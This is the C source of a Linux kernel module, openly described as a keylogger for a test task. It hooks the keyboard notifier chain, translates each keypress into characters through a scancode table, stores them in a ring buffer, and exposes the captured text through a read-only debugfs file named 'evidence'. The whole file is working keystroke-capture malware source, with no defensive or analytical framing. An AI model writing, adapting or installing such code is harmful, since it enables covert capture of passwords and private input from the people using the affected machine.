#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>
#include <linux/moduleparam.h>
#include <asm/io.h>

#define BUF_LEN 1024

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ilia Kovalev, <ovceev@protonmail.com>");
MODULE_VERSION("0.1 pre alpha beta gamma");
MODULE_DESCRIPTION("Keylogger for a test task");

static struct dentry *file;
static size_t buf_pos;
static char keys_buf[BUF_LEN];

static ssize_t read(struct file *filp,
		    char * buffer,
		    size_t len,
		    loff_t *offset);

static int cb(struct notifier_block *nb,
	      unsigned long action,
	      void *data);

static const char *keymap[][2] = {
    {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},                   // 0-3
    {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                             // 4-7
    {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                             // 8-11
    {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},                     // 12-14
    {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},         // 15-19
    {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                             // 20-23
    {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                             // 24-27
    {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},               // 28-31
    {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                             // 32-35
    {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                             // 36-39
    {"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"},             // 40-43
    {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                             // 44-47
    {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                             // 48-51
    {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},   // 52-55
    {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},       // 56-59 
    {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},                     // 60-63
    {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},                     // 64-67
    {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},               // 68-70
    {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"},             // 71-73
    {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},                     // 74-76
    {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},                     // 77-79
    {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"},             // 80-82
    {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},                  // 83-85
    {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},                 // 86-89
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
    {"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
    {"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},               // 99-101
    {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},               // 102-104
    {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},           // 105-107
    {"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},               // 108-110
    {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},               // 111-114
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},                     // 115-118
    {"_PAUSE_", "_PAUSE_"},                                                     // 119
};


const struct file_operations fops = {
    .read  = read,
};

static ssize_t read(struct file *filp,
		    char *buffer,
		    size_t len,
		    loff_t *offset)
{
    return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
}


static struct notifier_block nb = {
    .notifier_call = cb,
};

int cb(struct notifier_block *nblck,
       unsigned long action,
       void *data)
{
    size_t len;
    char keybuf[BUF_LEN] = {0};
    struct keyboard_notifier_param *param = data;

    if (!(param->down))
        return NOTIFY_OK;

    if (param->value > KEY_RESERVED && param->value <= KEY_PAUSE) {
        const char *key = (param->shift == 1)
        ? keymap[param->value][1]
        : keymap[param->value][0];
        snprintf(keybuf, BUF_LEN, "%s", key);
    }

    len = strlen(keybuf);

    if ((buf_pos + len) >= BUF_LEN)
            buf_pos = 0;

    strncpy(keys_buf + buf_pos, keybuf, len);
    buf_pos += len;

    return NOTIFY_OK;
}


static int keylogger_init(void)
{
    file = debugfs_create_file("evidence", 0400, NULL, NULL, &fops);
    if (!file)
        return -ENOENT;

    register_keyboard_notifier(&nb);
    return 0;
}

static void keylogger_exit(void) {
    unregister_keyboard_notifier(&nb);
    debugfs_remove(file);
}


module_init(keylogger_init);
module_exit(keylogger_exit);
